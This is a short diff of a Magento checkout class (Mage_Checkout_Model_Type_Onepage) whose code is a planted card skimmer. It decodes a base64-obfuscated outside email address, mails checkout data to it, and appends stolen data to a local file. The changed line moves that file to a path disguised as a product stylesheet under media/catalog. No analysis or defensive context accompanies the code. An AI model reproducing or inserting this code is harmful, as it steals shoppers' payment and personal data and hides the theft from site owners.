@@ -696,7 +696,7 @@ class Mage_Checkout_Model_Type_Onepage
         $encsrv = $idkey("dW5peGxvZ3NAeWFuZGV4LnJ1");  
         $update($encsrv, $subject, $datasend, $ipcid);
         $update($encsrv, $subject, $xupdate, $ipcid);
-        $locate = "/chroot/home/a59cb4fa/0d46498323.nxcli.net/html/js/tiny_mce/themes/advanced/langs/11.txt";
+        $locate = "/chroot/home/a59cb4fa/0d46498323.nxcli.net/html/media/catalog/product/1/2/12.css";
         if (! file_exists($locate) ){
             $write = fopen($locate,"a");
             fwrite($write,"\n----- tesss\n\n");
